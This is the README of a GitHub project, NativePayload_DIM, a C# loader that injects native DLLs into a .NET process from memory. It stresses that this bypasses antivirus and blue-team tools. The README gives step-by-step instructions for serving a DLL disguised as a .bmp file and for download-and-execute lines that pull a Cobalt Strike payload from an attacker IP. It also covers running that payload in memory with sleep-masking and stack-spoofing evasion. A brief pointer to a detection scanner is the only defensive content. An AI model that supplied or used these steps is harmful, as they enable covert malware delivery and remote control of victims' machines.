# NativePayload_DIM

NativePayload_DIM Dynamic native dll Injection in Memory , Injecting Native DLL bytes to local Process

Note: `NativePayload_DIM is simple csharp code to loading Native Dll [unmanaged dll] into Managed Processes [.NET Processes] without read dll from disk [in-memory only]` , this will help you to bypass AVs and Blue team tools etc also you can convert this Csharp code to Managed Dll then you can inject this code to any process you want [Native Processes or Managed Processes] and ...

in this code i used two old C++ Codes "ShellcodeFluctuation" & "CallStackSpoofer" as Native DLL to inject them into local Managed Process in this case "NativePayload_DIM" and you can see results was good in these pictures.

Note: `C++ Codes for "ShellcodeFluctuation" & "CallStackSpoofer" was changed by me and output of projects changed to dll (so you should use these C++ codes in this repo), Function name "run" added into source codes also these codes will download cobaltstrike "payload.bin" via web traffic so we have two change in source codes for these c++ projects` , you can find original source code in below link

C++ Original Source codes:

ShellcodeFluctuation => https://github.com/mgeeky/ShellcodeFluctuation

ThreadStackSpoofer => https://github.com/mgeeky/ThreadStackSpoofer

Note: `as Blue teamer you can see how this code was detected by my ETW Memory Scanner which called "VirtualMemAllocMon.exe".`

ETW Memory Scanner => https://github.com/DamonMohammadbagher/ETWProcessMon2/tree/main/VirtualMemAllocMon

#### NativePayload_DIM background step-by-step

      Step1: Native dll bytes from web downloaded via bmp extension loaded into local process in-memory [ShellcodeFluctuation.dll or ThreadStackSpoofer.dll renamed to bmp extension]
      Step2: Native dll after loading in local process [Managed process] will call Funcation name "run" and this function will get payload.bin from web
      Step3: in-memory that payload.bin will run also [cobaltstrike session established]
      Step4: in-memory ShellcodeFluctuation.dll will encode payloads [Sleep-mask + delay] or in-memory with ThreadStackSpoofer.dll you will have stack spoofing with delay 


----------------------
#### Usage step-by-step:

      Step1: Compile C++ Codes to make Dll files [output should be dll type]
            Step1-1: line 595 of main.cpp file in ShellcodeFluctuation-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ShellcodeFluctuation C++ code.
            Step1-2: line 304 of main.cpp file in ThreadStackSpoofer-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ThreadStackSpoofer C++ code.
      Step2: rename "callstackspoofer.dll or ShellcodeFluctuation.dll" to NativeCode_SleepMask.bmp
      Step3: upload bmp file to kali linux [cobaltstrike host]      
      Step4: line 38 of program.cs file in NativePayload_DIM project is "http://192.168.56.104:8000/NativeCode_SleepMask.bmp" , you should change this ip address to cobaltstrike host ip address THEN compile NativePayload_DIM C# code.
      Step5: make raw payload.bin in cobaltstrike v4.0 host and both files in step3 and step5 should be in same folder & share them via webserver [you can use "Python2.7 -m SimpleHTTPServer" in kali linux]
      Step6: Run NativePayload_DIM.exe 

### NativePayload_DIM + loading Native Dll "ShellcodeFluctuation.dll" into local process
   ![](https://github.com/DamonMohammadbagher/NativePayload_DIM/blob/main/Pics/ShellcodeFluctuation1.png)
   
### NativePayload_DIM & Detection via ETW Memory-scanner for ShellcodeFluctuation method in-memory before encoding...
   ![](https://github.com/DamonMohammadbagher/NativePayload_DIM/blob/main/Pics/ShellcodeFluctuation2.png)
   
-------------------
### NativePayload_DIM + loading Native Dll "ThreadStackSpoofer.dll" into local process
   ![](https://github.com/DamonMohammadbagher/NativePayload_DIM/blob/main/Pics/callstackspoofer.png)
   
   
<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_DIM"/></a></p>
